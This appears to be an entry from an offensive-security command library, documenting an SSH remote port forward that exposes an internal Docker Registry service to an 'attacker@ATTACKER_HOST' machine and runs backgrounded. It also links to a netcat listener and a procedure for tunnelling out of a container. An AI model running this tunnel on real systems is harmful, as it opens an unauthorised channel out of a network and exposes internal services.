---
id: cmd-ssh-forward
data: 'ssh -R 5555:172.17.0.1:5000 attacker@ATTACKER_HOST -p SSH_PORT -f -N'
tags:
  - ssh
  - tunnel
  - forward
type: command
output: Process ID of backgrounded SSH tunnel
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:57.729Z'
verified: false
validated: true
submitted: true
---
---
# ssh-remote-forward

## Command

```bash
ssh -R 5555:172.17.0.1:5000 attacker@ATTACKER_HOST -p SSH_PORT -f -N
```

## Description

Creates a remote port forward tunnel via SSH, mapping an external port to an internal service like the Docker Registry.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-R 5555:172.17.0.1:5000` | Remote forward: local 5555 to remote host:port | Yes |
| `attacker@ATTACKER_HOST` | SSH user and host | Yes |
| `-p SSH_PORT` | SSH server port (e.g., 22) | Yes |
| `-f` | Background the process | Yes |
| `-N` | No remote command execution | Yes |

## Examples

### Basic Usage

```bash
ssh -R 8080:localhost:80 user@host -f -N
```

### Advanced Usage

```bash
ssh -R 5555:172.17.0.1:5000 -i keyfile attacker@host -p 2222 -f -N
```

## Expected Output

SSH process starts in background; tunnel active after auth. Test with curl on local forwarded port.

## Related

- [[commands/netcat-listener]]
- [[procedures/Establish-SSH-Tunnel-from-Container]]

---
